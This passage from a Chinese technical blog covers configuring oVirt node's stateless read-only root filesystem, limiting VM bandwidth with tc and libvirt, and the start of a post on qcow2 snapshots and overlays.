<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">102a103,108</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt; elif [[ &quot;$system_release&quot; =~ &quot;CentOS&quot; ]]; then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt; [ &quot;$BOOTUP&quot; = &quot;color&quot; ] &amp;&amp; echo -en &quot;\\033[0;36m&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt; echo -en &quot;CentOS&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt; [ &quot;$BOOTUP&quot; = &quot;color&quot; ] &amp;&amp; echo -en &quot;\\033[0;39m&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt; PRODUCT=$(sed &quot;s/CentOS \(.*\) \?release.*/\1/&quot; /etc/system-release)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt; echo &quot; $PRODUCT&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">499c505</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt; action $&quot;Mounting local filesystems: &quot; mount -a -t nonfs,nfs4,smbfs,ncpfs,cifs,gfs,gfs2,noproc,nosysfs,nodevpts -O no_netdev</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">---</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt; action $&quot;Mounting local filesystems: &quot; mount -a -t nonfs,nfs4,smbfs,ncpfs,cifs,gfs,gfs2 -O no_netdev</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">501c507</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt; action $&quot;Mounting local filesystems: &quot; mount -a -n -t nonfs,nfs4,smbfs,ncpfs,cifs,gfs,gfs2,noproc,nosysfs,nodevpts -O no_netdev</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">---</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt; action $&quot;Mounting local filesystems: &quot; mount -a -n -t nonfs,nfs4,smbfs,ncpfs,cifs,gfs,gfs2 -O no_netdev</span><br></span></code></pre></div></div>
<p>接着看看这个/etc/statetab文件是个什么样子的：</p>
<p>/etc/statetab</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># A list of paths which should be bind-mounted from a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># partition dedicated to persistent data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># See $STATE_LABEL in /etc/sysconfig/readonly-root</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Examples:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># /root</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># /etc/ssh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># /var/spool/mail</span><br></span></code></pre></div></div>
<p>顺藤摸瓜我们发现和/etc/sysconfig/readonly-root这个文件有关，从文件名上即可得知和只读的关联：</p>
<p>/etc/sysconfig/readonly-root</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Set to &#x27;yes&#x27; to mount the system filesystems read-only.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">READONLY=yes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Set to &#x27;yes&#x27; to mount various temporary state as either tmpfs</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># or on the block device labelled RW_LABEL. Implied by READONLY</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">TEMPORARY_STATE=no</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Place to put a tmpfs for temporary scratch writable space</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RW_MOUNT=/var/lib/stateless/writable</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Label on local filesystem which can be used for temporary scratch space</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RW_LABEL=stateless-rw</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Options to use for temporary mount</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RW_OPTIONS=</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Label for partition with persistent data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">STATE_LABEL=CONFIG </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Where to mount to the persistent data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">STATE_MOUNT=/config</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Options to use for peristent mount</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">STATE_OPTIONS=</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># NFS server to use for persistent data?</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CLIENTSTATE=</span><br></span></code></pre></div></div>
<p>就是这个了，首先它把READONLY设置为yes，然后使用设备的LABEL号来指定需要挂载为读写的设备，然后就是挂载的位置STATE_MOUNT</p>
<p>同时还有/etc/rwtab以及rwtab.d目录与这个有关：
/etc/rwtab</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">#files /etc/adjtime</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#files /etc/ntp.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#files /etc/resolv.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#files /etc/lvm/.cache</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#files /etc/lvm/archive</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#files /etc/lvm/backup</span><br></span></code></pre></div></div>
<p>上面这几项在ovirt-node里是被注释掉了的，它使用自己的方式来变更这几个文件</p>
<p>/etc/rwtab.d/ovirt</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">files /etc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dirs /var/lib/multipath</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dirs /var/lib/net-snmp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dirs /var/lib/dnsmasq</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">files /root/.ssh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dirs /root/.uml</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dirs /root/.virt-manager</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dirs /home/admin/.virt-manager</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">files /var/cache/libvirt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">files /var/empty/sshd/etc/localtime</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">files /var/lib/libvirt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">files /var/lib/multipath</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">files /var/cache/multipathd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">empty /mnt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">empty /live</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">files /boot</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">empty /boot-kdump</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">empty /cgroup</span><br></span></code></pre></div></div>
<p>上面这些是ovirt自定义的。最后就是看/config下面的files文件:</p>
<p>/config/files</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/etc/fstab</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/shadow</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/default/ovirt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/ssh/ssh_host_key</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/ssh/ssh_host_key.pub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/ssh/ssh_host_dsa_key</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/ssh/ssh_host_dsa_key.pub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/ssh/ssh_host_rsa_key</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/ssh/ssh_host_rsa_key.pub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/iscsi/initiatorname.iscsi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/sysconfig/network-scripts/ifcfg-eth0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/sysconfig/network-scripts/ifcfg-breth0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/sysconfig/network-scripts/ifcfg-eth1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/ntp.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/sysconfig/network</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/hosts</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/shadow</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/ssh/sshd_config</span><br></span></code></pre></div></div>
<p>此列表内的文件就是rc.sysinit需要读取的，把他们一个个挂载为读写，这样就实现了可修改配置文件白名单，于是我就动手修改了系统里的这些文件，重启，一切看似正常，但是当关机的时候新的问题出现了，关机的时候提示/etc无法被卸载，为什么呢，然后就找到与关机有关的脚本：</p>
<p>diff /etc/rc.d/init.d/halt.orig /etc/rc.d/init.d/halt</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">141c141</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt; LANG=C __umount_loop &#x27;$2 ~ /^\/$|^\/proc|^\/dev/{next}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">---</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt; LANG=C __umount_loop &#x27;$2 ~ /^\/$|^\/proc|^\/etc|^\/dev/{next}</span><br></span></code></pre></div></div>
<p>原来在halt文件里也做了“手脚”，把/etc给加了进去，重启，修改，关机，一切正常。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="参考文档">参考文档<a href="#参考文档" class="hash-link" aria-label="参考文档的直接链接" title="参考文档的直接链接">​</a></h2>
<p>下面是可以参考的文档</p>
<ul>
<li><a href="http://fedoraproject.org/wiki/StatelessLinux/PrepareImage" target="_blank" rel="noopener noreferrer">http://fedoraproject.org/wiki/StatelessLinux/PrepareImage</a></li>
<li><a href="http://fedoraproject.org/wiki/StatelessLinux/HOWTO" target="_blank" rel="noopener noreferrer">http://fedoraproject.org/wiki/StatelessLinux/HOWTO</a></li>
<li><a href="http://blog.csdn.net/jcwkyl/article/details/6120547" target="_blank" rel="noopener noreferrer">http://blog.csdn.net/jcwkyl/article/details/6120547</a></li>
<li><a href="http://plone.lucidsolutions.co.nz/linux/io/using-centos-5.2-stateless-linux-support-on-a-flash-based-root-filesystem" target="_blank" rel="noopener noreferrer">http://plone.lucidsolutions.co.nz/linux/io/using-centos-5.2-stateless-linux-support-on-a-flash-based-root-filesystem</a></li>
<li>FYI: <a href="http://ovirt.org/wiki/File:Ovirt-node.pdf" target="_blank" rel="noopener noreferrer">http://ovirt.org/wiki/File:Ovirt-node.pdf</a> (page 26)</li>
</ul></div><footer class="row docusaurus-mt-lg"><div class="col"><b>标签：</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/ovirt">ovirt</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/stateless">stateless</a></li></ul></div></footer></article><article class="margin-bottom--xl"><header><h2 class="title_f1Hy"><a href="/notes/blog/2013/03/01/libvirt-tc-bandwidth-control">使用libvirt和tc实现vm带宽控制</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2013-03-01T00:00:00.000Z">2013年3月1日</time> · <!-- -->阅读需 3 分钟</div></header><div class="markdown"><blockquote>
<p>在kvm虚拟机管理的过程当中，对虚拟机带宽进行良好的控制是十分重要的。</p>
</blockquote>
<p>linux系统当中对网络带宽的控制一般都是使用tc命令实现，tc即是traffic control的缩写，在<a href="http://linux-ip.net/articles/Traffic-Control-HOWTO/" target="_blank" rel="noopener noreferrer">这里</a>可以找到有关tc命令的内容。</p>
<p>当然你可以手动使用tc命令来处理这些事情，比如使用cbq队列，htb队列等，都是可以实现的，网上找找应该有很多关于这方面的资料，</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="cbq队列示例">cbq队列示例<a href="#cbq队列示例" class="hash-link" aria-label="cbq队列示例的直接链接" title="cbq队列示例的直接链接">​</a></h2>
<p>比如下面就是使用cbq队列限制src ip为192.168.1.102发送数据包的速率:</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="1建立cbq队列">1.建立cbq队列<a href="#1建立cbq队列" class="hash-link" aria-label="1.建立cbq队列的直接链接" title="1.建立cbq队列的直接链接">​</a></h3>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">tc qdisc add dev eth0 root handle 1: cbq avpkt 1000 bandwidth 100mbit</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="2建立带宽限制分类">2.建立带宽限制分类<a href="#2建立带宽限制分类" class="hash-link" aria-label="2.建立带宽限制分类的直接链接" title="2.建立带宽限制分类的直接链接">​</a></h3>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">tc class add dev eth0 parent 1: classid 1:1 cbq rate 60mbit allot 1500 prio 5 bounded isolated</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tc class add dev eth0 parent 1: classid 1:2 cbq rate 70mbit allot 1500 prio 5 bounded isolated</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tc class add dev eth0 parent 1: classid 1:3 cbq rate 80mbit allot 1500 prio 5 bounded isolated</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="3建立过滤器">3.建立过滤器<a href="#3建立过滤器" class="hash-link" aria-label="3.建立过滤器的直接链接" title="3.建立过滤器的直接链接">​</a></h3>
<p>绑定指定带宽限制类型至指定虚拟机ip:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">tc filter add dev eth0 parent 1: protocol ip prio 16 u32 match ip src 192.168.1.102 flowid 1:2</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="htb队列示例">htb队列示例<a href="#htb队列示例" class="hash-link" aria-label="htb队列示例的直接链接" title="htb队列示例的直接链接">​</a></h2>
<p>我们可以在母机上给vm对应的虚拟网卡增加tc规则，使用htb队列，一个可用的脚本示例如下：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># add interface bandwidth limit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># usage: tc_add iface in_kbps out_kbps</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tc_add() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    local iface=$1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    local in_bw=$2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    local out_bw=$3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    local in_average=&quot;${in_bw}kbps&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    local in_peak=&quot;${in_bw}kbps&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    local out_average=&quot;${out_bw}kbps&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    local out_peak=&quot;${out_bw}kbps&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    local burst=&quot;2kb&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    local mtu=1500</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    local r2q=$((in_bw*1000/mtu-1))</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    local tc=&quot;/sbin/tc&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    [ $r2q -lt 1 ] &amp;&amp; r2q=1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if [ $in_bw != 0 ]; then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $tc qdisc add dev $iface root handle 1: htb default 2 r2q $r2q</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $tc class add dev $iface parent 1: classid 1:1 htb rate $in_average \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            ceil $in_peak burst $burst cburst $burst</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $tc class add dev $iface parent 1:1 classid 1:2 htb rate $in_average \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            ceil $in_peak burst $burst cburst $burst</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $tc qdisc add dev $iface parent 1:2 handle 2: sfq perturb 10</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $tc filter add dev $iface parent 1:0 protocol ip handle 1 fw flowid 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    fi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if [ $out_bw != 0 ]; then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $tc qdisc add dev $iface ingress</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $tc filter add dev $iface parent ffff: protocol ip u32 match ip src \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            0.0.0.0/0 police rate $out_average burst ${out_bw}kb mtu 64kb drop \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            flowid :1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    fi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># clean up interface bandwidth limit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># usage: tc_del iface</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tc_del() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    local iface=$1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    local tc=&quot;/sbin/tc&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $tc qdisc del dev $iface root &amp;&gt;&gt;/dev/null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    sleep 0.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $tc qdisc del dev $iface ingress &amp;&gt;&gt;/dev/null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="libvirt中的带宽控制">libvirt中的带宽控制<a href="#libvirt中的带宽控制" class="hash-link" aria-label="libvirt中的带宽控制的直接链接" title="libvirt中的带宽控制的直接链接">​</a></h2>
<p>我比较推荐的方法还是直接使用libvirt，libvirt 中已经集成了带宽控制的功能，下面是关于带宽控制部分的xml描述:</p>
<p>使用方法：在网卡interface中加入</p>
<div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">bandwidth</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">inbound</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">average</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag attr-value" style="color:#e3116c">1000</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">peak</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag attr-value" style="color:#e3116c">5000</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">burst</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag attr-value" style="color:#e3116c">1024</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag punctuation" style="color:#393A34">/&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">outbound</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">average</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag attr-value" style="color:#e3116c">128</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">peak</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag attr-value" style="color:#e3116c">256</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">burst</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag attr-value" style="color:#e3116c">256</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag punctuation" style="color:#393A34">/&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">bandwidth</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre></div></div>
<p>以下是关于各项参数的解释，获取最新的信息可以参考<a href="http://www.libvirt.org/" target="_blank" rel="noopener noreferrer">libvirt文档</a>.</p>
<ul>
<li>
<p>mandatory attribute:</p>
<ul>
<li>average: It specifies average bit rate on interface being shaped.</li>
</ul>
</li>
<li>
<p>optional attributes:</p>
<ul>
<li>peak: which specifies maximum rate at which interface can send data,</li>
<li>burst: amount of bytes that can be burst at peak speed.</li>
</ul>
</li>
</ul>
<p>Accepted values: integer numbers.</p>
<p>units:</p>
<ul>
<li>average: kilobytes per second</li>
<li>peak: kilobytes per second</li>
<li>burst: kilobytes.</li>
</ul></div><footer class="row docusaurus-mt-lg"><div class="col"><b>标签：</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/libvirt">libvirt</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/tc">tc</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/bandwidth">bandwidth</a></li></ul></div></footer></article><article class="margin-bottom--xl"><header><h2 class="title_f1Hy"><a href="/notes/blog/2012/11/23/libvirt-snapshot-blockcommit-blockpull">浅析qcow2镜像文件的快照合并</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2012-11-23T00:00:00.000Z">2012年11月23日</time> · <!-- -->阅读需 13 分钟</div></header><div class="markdown"><blockquote>
<p>这是一篇关于snapshots, blockpull, blockcommit的的介绍.作者和with Eric Blake, Jeff Cody,Kevin Wolf以及很多IRC和mailing lists里面的同学大量讨论以及作者大量的特向测试的基础之上总结出来的</p>
</blockquote>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="基础知识">基础知识<a href="#基础知识" class="hash-link" aria-label="基础知识的直接链接" title="基础知识的直接链接">​</a></h2>
<p>一个虚拟机快照可被看作是虚拟机的在某个指定时间的视图（包括他的操作系统和所有的程序）.据此，某可以还原到一个之前的完整的状态，或者在guest运行的时候做个备份.所以，在我们继续深入之前我们必须搞懂两个名词：backing files和overlays .</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="qcow2-backing-files-与-overlays">QCOW2 backing files 与 overlays<a href="#qcow2-backing-files-与-overlays" class="hash-link" aria-label="QCOW2 backing files 与 overlays的直接链接" title="QCOW2 backing files 与 overlays的直接链接">​</a></h3>
<p>qcow2（qemu copy-on-write）具有创建一个base-image，以及在base-image（即backing file）的基础上创建多个copy-on-write overlays镜像的能力.backing files和overlays十分有用，可以迅速的创建瘦装备虚拟机的实例，特别是在开发测试的时候可以让你迅速的回滚到之前的某个已知状态，丢弃overlay.</p>
<p>Figure-1</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.--------------.    .-------------.    .-------------.    .-------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|              |    |             |    |             |    |             |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| RootBase     |&lt;---| Overlay-1   |&lt;---| Overlay-1A  &lt;--- | Overlay-1B  |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| (raw/qcow2)  |    | (qcow2)     |    | (qcow2)     |    | (qcow2)     |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&#x27;--------------&#x27;    &#x27;-------------&#x27;    &#x27;-------------&#x27;    &#x27;-------------&#x27;</span><br></span></code></pre></div></div>
<p>上图表明rootbase是overlay-1的backing file，以此类推.</p>
<p>Figure-2</p>
